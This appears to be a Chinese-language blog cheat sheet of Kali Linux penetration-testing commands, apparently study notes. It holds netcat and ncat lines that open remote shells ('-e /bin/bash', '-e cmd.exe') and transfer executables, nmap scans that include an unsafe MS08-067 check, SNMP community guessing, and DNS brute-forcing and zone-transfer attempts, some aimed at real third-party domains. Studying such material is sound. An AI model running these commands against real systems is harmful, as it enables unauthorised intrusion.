---
layout: ../../../layouts/BlogPost.astro
title: "【Pentest】Kali学习命令汇总"
uuid: c06c95aa-4897-11ed-8fd9-f296579e3926
version: 2
created: Sun, 13 Jun 2021 14:33:33 +0000
tags:
- imported/evernote
---

updatedb\
locate sbd.exe\
which sbd\
find / -name sbd\*\
systemctl start ssh\
netstat -antp|grep sshd\
systemctl enable ssh\
systemctl start apache2\
netstat -antp |grep apache\
systemctl enable apache2\
wget [www.cisco.com](http://www.cisco.com/)\
ls -l index.html\
grep "href=" index.html\
grep "href=" index.html | cut -d "/" -f 3\
grep "href=" index.html | cut -d "/" -f 3 | grep "."\
grep "href=" index.html |cut -d "/" -f 3 | grep "." | cut -d '"' -f 1\
grep "href=" index.html | cut -d "/" -f 3 | grep "." | cut -d '"' -f 1 | sort -u\
cat index.html | grep -o '[http://\[^"\]\*](http://%5b%5e%22%5d%2a/)' | cut -d "/" -f 3 | sort -u > list.txt\
for url in $(cat list.txt); do host $url; done\
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u\
gunzip access_log.txt.gz\
mv access_log.txt access.log\
head access.log\
wc -l access.log\
cat access.log | cut -d " " -f 1 | sort -u\
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn\
cat access.log | grep '208.68.234.99' | cut -d """ -f 2 | uniq -c\
cat access.log | grep '208.68.234.99' | grep '/admin ' | sort -u\
cat access.log|grep '208.68.234.99'| grep -v '/admin '\
**nc** -nv 10.0.0.22 110\
C:\\Users\\offsec>nc -nlvp 4444\
nc -nv 10.0.0.22 4444\
C:\\Users\\offsec>nc -nlvp 4444 > incoming.exe\
locate wget.exe\
nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe\
C:\\Users\\offsec>incoming.exe -h\
C:\\Users\\offsec>nc -nlvp 4444 -e cmd.exe\
ifconfig eth0 | grep inet\
nc -nv 10.0.0.22 4444\
C:\\Users\\offsec>nc -nlvp 4444\
nc -nv 10.0.0.22 4444 -e /bin/bash\
C:\\Users\\offsec>**ncat** --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl\
ncat -v 10.0.0.22 4444 --ssl\
**tcpdump** -r password_cracking_filtered.pcap\
tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort -u | head\
tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap\
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap\
tcpdump -n port 81 -r password_cracking_filtered.pcap\
tcpdump -nX -r password_cracking_filtered.pcap\
tcpdump -A -n 'tcp\[13\] = 24' -r password_cracking_filtered.pcap\
**theharvester** -d [cisco.com](http://cisco.com/) -b google >google.txt\
theharvester -d [cisco.com](http://cisco.com/) -l 10 -b bing >bing.txt\
**whois** [megacorpone.com](http://megacorpone.com/)\
whois 50.7.67.186\
recon-ng\
\[recon-ng\]\[default\] > use recon/domains-contacts/whois_pocs\
\[recon-ng\]\[default\]\[whois_pocs\] > show options\
\[recon-ng\]\[default\]\[whois_pocs\] > set SOURCE [cisco.com](http://cisco.com/)\
\[recon-ng\]\[default\]\[xssed\] > run

---

\[recon-ng\]\[default\] > use recon/domains-vulnerabilities/xssed\
\[recon-ng\]\[default\]\[xssed\] > set SOURCE [cisco.com](http://cisco.com/)\
\[recon-ng\]\[default\]\[xssed\] > run

---

\[recon-ng\]\[default\] > use recon/domains-hosts/google_site_web\
\[recon-ng\]\[default\]\[google_site_web\] > set SOURCE [cisco.com](http://cisco.com/)\
\[recon-ng\]\[default\]\[google_site_web\] > run\
**host** -t ns [megacorpone.com](http://megacorpone.com/)\
host -t mx [megacorpone.com](http://megacorpone.com/)\
host [www.megacorpone.com](http://www.megacorpone.com/)\
host [idontexist.megacorpone.com](http://idontexist.megacorpone.com/)\
nslookup -type=any [www.megacorpone.com](http://www.megacorpone.com/) -server 8.8.8.8\
dig @8.8.8.8 [sina.com](http://sina.com/) mx\
dig [baidu.com](http://baidu.com/) any\
dig +noall +answer -x 8.8.8.8\
dig +noall +answer txt chaos VERSION.BIND @[ns3.dnsv4.com](http://ns3.dnsv4.com/)\
dig +trace [example.com](http://example.com/)\
DNS区域传输\
dig @ns1.[example.com](http://example.com/) [example.com](http://example.com/) axfr\
host -T -l [sina.com](http://sina.com/) [ns3.sina.com](http://ns3.sina.com/)\
DNS字典爆破\
fierce -dnsserver 114.114.114.114 -dns [versun.org](http://versun.org/) -wordlist /usr/share/fierce/hosts.txt\
dnsdict6 -d4 -t 16 -x [sina.com](http://sina.com/) ##建议用这个，速度更快\
dnsrecon -d [versun.org](http://versun.org/) --lifetime 10 -t brt -D /usr/share/dnsrecon/namelist.txt\
echo www > list.txt\
echo ftp >> list.txt\
for ip in $(cat list.txt);do host $[\[ip.megacorpone.com\](http://ip.megacorpone.com/);done](\[http://ip.megacorpone.com\](http://ip.megacorpone.com/);done/)\
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"\
host -l [megacorpone.com](http://megacorpone.com/) [ns1.megacorpone.com](http://ns1.megacorpone.com/)\
host -l [megacorpone.com](http://megacorpone.com/) [ns2.megacorpone.com](http://ns2.megacorpone.com/)\
host -t ns [megacorpone.com](http://megacorpone.com/) | cut -d " " -f 4\
\#!/bin/bash\
if \[-z "$1"\]; then\
echo "\[\*\] Simple Zone transfer script"\
echo "\[\*\] Usage : $0 <domain name> "\
exit 0\
fi\
for server in $(host -t ns $1 |cut -d" " -f4);do\
host -l $1 $server |grep "has address"\
done\
chmod 755 [dns-axfr.sh](http://dns-axfr.sh/)\
./dns-axfr.sh [megacorpone.com](http://megacorpone.com/)\
**dnsrecon** -d [megacorpone.com](http://megacorpone.com/) -t axfr\
**dnsenum** [zonetransfer.me](http://zonetransfer.me/)\
nc -nvv -w 1 -z 10.0.0.19 3388-3390\
nc -nv -u -z -w 1 10.0.0.19 160-162\
**iptables** -I INPUT 1 -s 10.0.0.19 -j ACCEPT\
iptables -I OUTPUT 1 -d 10.0.0.19 -j ACCEPT\
iptables -Z\
**nmap** -sT 10.0.0.19\
iptables -vn -L\
iptables -Z\
nmap -sT -p 1-65535 10.0.0.19\
nmap -sn 10.11.1.1-254 利用ping来发现\
nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt\
grep Up ping-sweep.txt | cut -d " " -f 2\
nmap -p 80 10.11.1.1-254 -oG web-sweep.txt\
grep open web-sweep.txt |cut -d" " -f2\
nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt\
nmap -O 10.0.0.19\
nmap -sV -sT 10.0.0.19\
nmap 10.0.0.19 --script smb-os-discovery.nse\
nmap --script=dns-zone-transfer -p 53 [ns2.megacorpone.com](http://ns2.megacorpone.com/)\
nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254\
nbtscan -r 10.11.1.0/24\
enum4linux -a 10.11.1.227\
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227\
ls -l /usr/share/nmap/scripts/smb\*\
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.201\
nc -nv 10.11.1.215 25\
nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt\
echo public > community\
echo private >> community\
echo manager >> community\
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips\
onesixtyone -c community -i ips\
snmpwalk -c public -v1 10.11.1.219\
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25\
nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210\
nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254\
nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236\
nmap -v -p 80 --script=http-vuln-cve2011-3192 10.11.1.205-210\
nmap -iL iplist.txt -sn\
tcpdump -i eth0 -s 0 -w file.pcap\
tcpdump -i eth0 port 22\
tcpdump -r file.pcap\
tcpdump -A -r file.pcap\
tcpdump -X -r file.pcap\
tcpdump -n -r http.cap //-n：不解析里面出现的IP地址\
tcpdump -n src host 192.168.2.33 -r http.cap\
tcpdump -n tcp port 53 -r http.cap\
tcpdump -n port 53 -r http.cap\
tcpdump -A -n 'tcp\[13\]=24' -r http.cap\
利用搜索引擎\
theharvester -d [163.com](http://163.com/) -l 200 -b bing #搜索邮件和主机\
metagoofil -d [sina.com](http://sina.com/) -t pdf -l 200 -o test -f 1.html\
通过代理启动一个命令\
proxychains theharvester......\
专属密码字典生成\
cupp\
图片exif信息查询\
exiftool 1.jpg\
arp-二层发现\
主动发现：\
arping\
netdiscover -i eth0 -r 1.1.1.0/24\
netdiscover -l iplist\
被动发现(混杂监听)：\
netdiscover -p\
三层发现\
fping -g 192.168.1.1 192.168.1.100 -c 2 地址段\
hping3 192.168.1.1 —icmp -c 2\
scapy\
response=sr1(IP(dst="192.168.1.1")/TCP(dport=80,flags='A'),timeout=1)\
四层发现(nmap -PU)\
nmap 1.1.1.1-254 -PU53333 -sn (udp主机发现)\
nmap 1.1.1.1-254 -PA80 -sn （ACK包）\
hping3 192.168.1.1 —udp -c 2 -A （ACK包，默认为TCP）